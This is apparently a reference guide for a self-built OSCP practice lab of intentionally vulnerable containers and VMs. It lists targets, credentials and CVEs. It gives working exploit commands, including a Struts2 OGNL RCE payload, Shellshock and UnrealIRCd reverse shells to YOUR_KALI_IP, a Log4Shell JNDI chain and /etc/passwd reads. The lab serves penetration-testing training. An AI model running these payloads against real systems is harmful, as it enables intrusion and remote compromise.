# OSCP Vulnerable Lab — Target Reference Guide
**Network:** 172.20.0.0/24  |  **Total Targets:** 13  |  **Linux:** 13 Docker + Windows: VirtualBox (see bottom)

---

## QUICK COMMANDS
```bash
# Start everything
docker-compose up -d

# Start one target
docker-compose up -d dvwa

# Stop everything
docker-compose down

# Check status
docker-compose ps

# View logs
docker-compose logs -f vsftpd

# Restart one
docker-compose restart shellshock

# Shell into a container
docker exec -it vuln-dvwa /bin/bash
```

---

## WEB APPLICATION TARGETS (🌐)

### 1. DVWA — Damn Vulnerable Web Application
| Field | Value |
|---|---|
| **Container** | `vuln-dvwa` |
| **IP** | `172.20.0.10` |
| **Port** | `80` |
| **URL** | `http://172.20.0.10/` |
| **Login** | `admin / password` |
| **Vulnerabilities** | SQL Injection, XSS (Stored/Reflected/DOM), CSRF, File Upload, LFI, Command Injection, Brute Force |
| **OSCP Phase** | Web App Pentest |
| **Dashboard Target** | `http://172.20.0.10` |

**Practice attacks:**
```bash
# SQL Injection (Low security)
sqlmap -u "http://172.20.0.10/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=XXX; security=low" --dbs

# Command Injection
# In browser: 127.0.0.1; id
# Or: 127.0.0.1 && cat /etc/passwd

# File Upload (webshell)
# Upload a PHP webshell, then browse to /hackable/uploads/shell.php
```

---

### 2. WebGoat — OWASP WebGoat
| Field | Value |
|---|---|
| **Container** | `vuln-webgoat` |
| **IP** | `172.20.0.11` |
| **Port** | `8080` |
| **URL** | `http://172.20.0.11:8080/WebGoat` |
| **Login** | Register new user on first visit |
| **Vulnerabilities** | OWASP Top 10 — all categories with guided lessons |
| **OSCP Phase** | Web App Pentest |

---

### 3. OWASP Juice Shop
| Field | Value |
|---|---|
| **Container** | `vuln-juiceshop` |
| **IP** | `172.20.0.12` |
| **Port** | `3000` |
| **URL** | `http://172.20.0.12:3000` |
| **Login** | `admin@juice-sh.op / admin123` |
| **Vulnerabilities** | 100+ challenges: SQLi, XSS, IDOR, SSRF, JWT manipulation, broken auth |
| **OSCP Phase** | Web App Pentest |

**Quick win:**
```bash
# Login bypass SQL injection
# Email: ' OR 1=1--    Password: anything
```

---

### 4. Mutillidae II
| Field | Value |
|---|---|
| **Container** | `vuln-mutillidae` |
| **IP** | `172.20.0.13` |
| **Port** | `80` |
| **URL** | `http://172.20.0.13/` |
| **Login** | `admin / adminpass` |
| **Vulnerabilities** | OWASP Top 10, WASC-TC: SQLi, XSS, XXE, CSRF, Clickjacking |
| **OSCP Phase** | Web App Pentest |

---

### 5. bWAPP — Buggy Web Application
| Field | Value |
|---|---|
| **Container** | `vuln-bwapp` |
| **IP** | `172.20.0.14` |
| **Port** | `80` |
| **URL** | `http://172.20.0.14/bWAPP/login.php` |
| **Login** | `bee / bug` |
| **Vulnerabilities** | 100+ bugs across all OWASP categories incl. Shellshock, Heartbleed, XML injection |
| **OSCP Phase** | Web App Pentest |

---

## EXPLOIT / SERVICE TARGETS (💥)

### 6. vsftpd 2.3.4 — CVE-2011-2523
| Field | Value |
|---|---|
| **Container** | `vuln-vsftpd` |
| **IP** | `172.20.0.20` |
| **Port** | `21` (FTP), `6200` (backdoor shell) |
| **CVE** | `CVE-2011-2523` |
| **CVSS** | 10.0 (Critical) |
| **Type** | Backdoor |
| **MSF Module** | `exploit/unix/ftp/vsftpd_234_backdoor` |
| **Payload** | `cmd/unix/interact` |
| **Auth** | Not required |

**How it works:** Sending `:)` in the FTP username triggers the backdoor — opens a root bind shell on port 6200.

**Manual exploit:**
```bash
# Using netcat
nc 172.20.0.20 21
USER backdoor:)
PASS anything
# Then in second terminal:
nc 172.20.0.20 6200

# Using Metasploit
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 172.20.0.20; run"

# Using searchsploit
searchsploit vsftpd 2.3.4
```

---

### 7. SambaCry — CVE-2017-7494
| Field | Value |
|---|---|
| **Container** | `vuln-sambacry` |
| **IP** | `172.20.0.21` |
| **Port** | `445` (SMB), `139` (NetBIOS) |
| **CVE** | `CVE-2017-7494` |
| **CVSS** | 7.5 (High) |
| **Type** | Arbitrary shared library loading → RCE |
| **MSF Module** | `exploit/linux/samba/is_known_pipename` |
| **Payload** | `linux/x86/shell_reverse_tcp` |
| **Samba Version** | 4.x (4.0.0 – 4.6.4) |
| **Auth** | Guest/anonymous write access required |

**Manual exploit:**
```bash
# Check Samba version
smbclient -L //172.20.0.21 -N

# MSF
msfconsole -q -x "use exploit/linux/samba/is_known_pipename; set RHOSTS 172.20.0.21; set LHOST YOUR_KALI_IP; run"
```

---

### 8. Apache Struts2 — CVE-2017-5638 (S2-045)
| Field | Value |
|---|---|
| **Container** | `vuln-struts2` |
| **IP** | `172.20.0.22` |
| **Port** | `8080` |
| **URL** | `http://172.20.0.22:8080/struts2/` |
| **CVE** | `CVE-2017-5638` |
| **CVSS** | 10.0 (Critical) |
| **Type** | OGNL expression injection via Content-Type header |
| **MSF Module** | `exploit/multi/http/struts2_content_type_ognl` |
| **Payload** | `linux/x86/shell_reverse_tcp` |
| **Auth** | Not required |

**Manual exploit:**
```bash
# Test RCE via Content-Type
curl -X POST http://172.20.0.22:8080/struts2/login.action \
  -H 'Content-Type: %{(#_="multipart/form-data").(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context["com.opensymphony.xwork2.ActionContext.container"]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd="id").(#iswin=(@java.lang.System@getProperty("os.name").toLowerCase().contains("win"))).(#cmds=(#iswin?{"cmd.exe","/c",#cmd}:{"/bin/bash","-c",#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}'
```

---

### 9. Shellshock — CVE-2014-6271
| Field | Value |
|---|---|
| **Container** | `vuln-shellshock` |
| **IP** | `172.20.0.23` |
| **Port** | `80` |
| **URL** | `http://172.20.0.23/cgi-bin/test.cgi` |
| **CVE** | `CVE-2014-6271` |
| **CVSS** | 10.0 (Critical) |
| **Type** | Bash function definition in env var — RCE via CGI |
| **MSF Module** | `exploit/multi/http/apache_mod_cgi_bash_env_exec` |
| **Auth** | Not required |

**Manual exploit:**
```bash
# Read /etc/passwd via User-Agent
curl -H "User-Agent: () { :;}; echo; /bin/cat /etc/passwd" http://172.20.0.23/cgi-bin/test.cgi

# Reverse shell
curl -H "User-Agent: () { :;}; echo; bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1" http://172.20.0.23/cgi-bin/test.cgi

# MSF
msfconsole -q -x "use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOSTS 172.20.0.23; set TARGETURI /cgi-bin/test.cgi; set LHOST YOUR_KALI_IP; run"
```

---

### 10. Heartbleed — CVE-2014-0160
| Field | Value |
|---|---|
| **Container** | `vuln-heartbleed` |
| **IP** | `172.20.0.24` |
| **Port** | `443` (HTTPS) |
| **CVE** | `CVE-2014-0160` |
| **CVSS** | 7.5 (High) |
| **Type** | OpenSSL TLS heartbeat — server memory leak (up to 64KB per request) |
| **OpenSSL** | 1.0.1 – 1.0.1f |
| **MSF Module** | `auxiliary/scanner/ssl/openssl_heartbleed` |
| **Auth** | Not required |

**Manual exploit:**
```bash
# Using nmap script
nmap --script ssl-heartbleed -p 443 172.20.0.24

# Using MSF (read memory)
msfconsole -q -x "use auxiliary/scanner/ssl/openssl_heartbleed; set RHOSTS 172.20.0.24; set RPORT 443; set VERBOSE true; run"

# Using Python PoC
python heartbleed.py 172.20.0.24
```

---

### 11. Log4Shell — CVE-2021-44228
| Field | Value |
|---|---|
| **Container** | `vuln-log4shell` |
| **IP** | `172.20.0.25` |
| **Port** | `8983` (Apache Solr) |
| **URL** | `http://172.20.0.25:8983/solr/` |
| **CVE** | `CVE-2021-44228` |
| **CVSS** | 10.0 (Critical) |
| **Type** | Log4j JNDI lookup → LDAP → RCE |
| **Log4j Version** | 2.0-beta9 – 2.14.1 |
| **MSF Module** | `exploit/multi/misc/log4shell_header_injection` |
| **Auth** | Not required |

**Manual exploit:**
```bash
# Step 1: Set up LDAP server (marshalsec)
git clone https://github.com/mbechler/marshalsec
cd marshalsec && mvn package -q
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR_KALI_IP:8000/#Exploit"

# Step 2: Create reverse shell class
# Compile Exploit.java that runs bash reverse shell

# Step 3: Serve it
python3 -m http.server 8000

# Step 4: Trigger via User-Agent
curl "http://172.20.0.25:8983/solr/admin/cores" -H 'User-Agent: ${jndi:ldap://YOUR_KALI_IP:1389/a}'

# MSF (simpler)
msfconsole -q -x "use exploit/multi/misc/log4shell_header_injection; set RHOSTS 172.20.0.25; set RPORT 8983; set LHOST YOUR_KALI_IP; run"
```

---

### 12. UnrealIRCd 3.2.8.1 — CVE-2010-2075
| Field | Value |
|---|---|
| **Container** | `vuln-unrealircd` |
| **IP** | `172.20.0.26` |
| **Port** | `6667` (IRC) |
| **CVE** | `CVE-2010-2075` |
| **CVSS** | 10.0 (Critical) |
| **Type** | Backdoor — DEBUG3_DOLOG_SYSTEM function in distributed source |
| **MSF Module** | `exploit/unix/irc/unreal_ircd_3281_backdoor` |
| **Payload** | `cmd/unix/reverse` |
| **Auth** | Not required |

**Manual exploit:**
```bash
# Connect and trigger backdoor (send AB; prefix)
nc 172.20.0.26 6667
AB; bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1

# MSF
msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS 172.20.0.26; set LHOST YOUR_KALI_IP; run"
```

---

### 13. ProFTPd 1.3.3c — CVE-2010-4221
| Field | Value |
|---|---|
| **Container** | `vuln-proftpd` |
| **IP** | `172.20.0.27` |
| **Port** | `21` (FTP) |
| **CVE** | `CVE-2010-4221` |
| **CVSS** | 10.0 (Critical) |
| **Type** | Backdoor via HELP ACIDBITCHEZ command → root shell |
| **MSF Module** | `exploit/unix/ftp/proftpd_133c_backdoor` |
| **Auth** | Not required |

**Manual exploit:**
```bash
# Trigger backdoor
nc 172.20.0.27 21
HELP ACIDBITCHEZ
# Root shell opens

# MSF
msfconsole -q -x "use exploit/unix/ftp/proftpd_133c_backdoor; set RHOSTS 172.20.0.27; set LHOST YOUR_KALI_IP; run"
```

---

## WINDOWS TARGETS (VirtualBox — not Docker)

Windows cannot run in Docker on Linux. Use VirtualBox instead.

| # | Name | CVE | MSF Module | Download |
|---|---|---|---|---|
| W1 | Windows XP SP3 | CVE-2008-4250 (MS08-067) | `exploit/windows/smb/ms08_067_netapi` | Search "Windows XP SP3 VirtualBox VDI" |
| W2 | Windows 7 SP1 x64 | CVE-2017-0144 (MS17-010) | `exploit/windows/smb/ms17_010_eternalblue` | Search "Windows 7 SP1 VirtualBox VDI" |
| W3 | Windows Server 2003 | CVE-2003-0026 (MS03-026) | `exploit/windows/dcerpc/ms03_026_dcom` | Search "Windows Server 2003 VirtualBox" |

**VirtualBox setup for Windows VMs:**
```
1. Download VM from Softpedia, Archive.org, or OldVersion.com
2. VirtualBox → New → import VDI
3. Network: Host-Only Adapter (same as Kali)
4. Boot VM, note IP (ipconfig)
5. Disable Windows Firewall for testing:
   netsh firewall set opmode disable
```

**Suggested IPs for Windows VMs (set manually):**
- Windows XP: `192.168.56.104`
- Windows 7: `192.168.56.105`

---

## COMPLETE TARGET SUMMARY

| # | Name | IP | Port | CVE | Type | MSF Module | OS |
|---|---|---|---|---|---|---|---|
| 1 | DVWA | 172.20.0.10 | 80 | Multiple | Web App | N/A | 🐧 |
| 2 | WebGoat | 172.20.0.11 | 8080 | Multiple | Web App | N/A | 🐧 |
| 3 | Juice Shop | 172.20.0.12 | 3000 | Multiple | Web App | N/A | 🐧 |
| 4 | Mutillidae | 172.20.0.13 | 80 | Multiple | Web App | N/A | 🐧 |
| 5 | bWAPP | 172.20.0.14 | 80 | Multiple | Web App | N/A | 🐧 |
| 6 | vsftpd 2.3.4 | 172.20.0.20 | 21 | CVE-2011-2523 | Backdoor | `exploit/unix/ftp/vsftpd_234_backdoor` | 🐧 |
| 7 | SambaCry | 172.20.0.21 | 445 | CVE-2017-7494 | RCE | `exploit/linux/samba/is_known_pipename` | 🐧 |
| 8 | Struts2 S2-045 | 172.20.0.22 | 8080 | CVE-2017-5638 | RCE | `exploit/multi/http/struts2_content_type_ognl` | 🐧 |
| 9 | Shellshock | 172.20.0.23 | 80 | CVE-2014-6271 | RCE | `exploit/multi/http/apache_mod_cgi_bash_env_exec` | 🐧 |
| 10 | Heartbleed | 172.20.0.24 | 443 | CVE-2014-0160 | Info Leak | `auxiliary/scanner/ssl/openssl_heartbleed` | 🐧 |
| 11 | Log4Shell | 172.20.0.25 | 8983 | CVE-2021-44228 | RCE | `exploit/multi/misc/log4shell_header_injection` | 🐧 |
| 12 | UnrealIRCd | 172.20.0.26 | 6667 | CVE-2010-2075 | Backdoor | `exploit/unix/irc/unreal_ircd_3281_backdoor` | 🐧 |
| 13 | ProFTPd 1.3.3c | 172.20.0.27 | 21 | CVE-2010-4221 | Backdoor | `exploit/unix/ftp/proftpd_133c_backdoor` | 🐧 |
| W1 | Windows XP SP3 | 192.168.56.104 | 445 | CVE-2008-4250 | BOF | `exploit/windows/smb/ms08_067_netapi` | 🪟 |
| W2 | Windows 7 SP1 | 192.168.56.105 | 445 | CVE-2017-0144 | RCE | `exploit/windows/smb/ms17_010_eternalblue` | 🪟 |
| W3 | Windows Server 2003 | 192.168.56.106 | 135 | CVE-2003-0026 | RCE | `exploit/windows/dcerpc/ms03_026_dcom` | 🪟 |

**Total: 13 Docker (Linux) + 3 VirtualBox (Windows) = 16 targets**

---

## INSTALL ON KALI

```bash
# Option A: Run setup script
chmod +x setup.sh
sudo ./setup.sh

# Option B: Manual
sudo apt install docker.io docker-compose -y
sudo systemctl start docker
sudo docker-compose up -d

# Check all running
sudo docker-compose ps

# Your Kali IP (use as LHOST)
ip a | grep "inet " | grep -v 127
```

---

*All systems are intentionally vulnerable. Use only on isolated lab networks. Never expose to the internet.*
